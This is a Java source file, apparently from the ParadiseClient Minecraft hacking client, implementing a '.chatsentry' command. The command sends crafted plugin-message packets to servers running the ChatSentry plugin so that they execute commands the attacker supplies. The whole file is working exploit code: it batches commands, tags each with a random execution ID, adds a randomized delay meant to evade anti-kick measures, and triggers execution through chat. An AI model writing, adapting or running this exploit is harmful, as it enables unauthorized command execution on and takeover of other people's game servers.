package io.github.spigotrce.paradiseclientfabric.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import io.github.spigotrce.paradiseclientfabric.Helper;
import io.github.spigotrce.paradiseclientfabric.command.Command;
import io.github.spigotrce.paradiseclientfabric.packet.ChatSentryPayloadPacket;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;

import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;

public class ChatSentryCommand extends Command {
    private final ExecutorService executor = Executors.newCachedThreadPool();

    public ChatSentryCommand() {
        super("chatsentry", "Executes ChatSentry payloads (bungee/backend) with auto execution, random ID, and async support");
    }

    @Override
    public void build(LiteralArgumentBuilder<CommandSource> root) {
        root.executes(context -> {
                    Helper.printChatMessage("Usage: .chatsentry <bungee/backend> <command>");
                    return SINGLE_SUCCESS;
                })
                .then(literal("bungee")
                        .then(argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    String cmd = context.getArgument("command", String.class);
                                    Helper.sendPacket(new CustomPayloadC2SPacket(
                                            new ChatSentryPayloadPacket(cmd, true, "", "")
                                    ));
                                    Helper.printChatMessage("§a[ChatSentry] §fBungee payload sent: §e" + cmd);
                                    return SINGLE_SUCCESS;
                                })
                        ))
                .then(literal("backend")
                        .then(argument("command", StringArgumentType.greedyString())
                                .executes(context -> {
                                    String cmd = context.getArgument("command", String.class);
                                    executor.execute(() -> sendAutoExecution(cmd));
                                    return SINGLE_SUCCESS;
                                })
                        ));
    }

    private void sendAutoExecution(String command) {
        String[] cmds = command.split(";");
        for (String cmd : cmds) {
            cmd = cmd.trim();
            if (cmd.isEmpty()) continue;

            String execId = Helper.generateRandomString(6, "abcdefghijklmnopqrstuvwxyz0123456789", new Random());

            Helper.sendPacket(new CustomPayloadC2SPacket(
                    new ChatSentryPayloadPacket(cmd, false, "config", execId)
            ));

            Helper.sendPacket(new CustomPayloadC2SPacket(
                    new ChatSentryPayloadPacket(cmd, false, "module", execId)
            ));

            Helper.printChatMessage("§a[ChatSentry] §fPayload sent for command: §b" + cmd + " §7[ID: " + execId + "]");

            try {
                TimeUnit.MILLISECONDS.sleep(150 + new Random().nextInt(100)); // Delay to prevent anti-kick
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
            }

            getMinecraftClient().getNetworkHandler().sendChatMessage(execId);
        }
    }
}
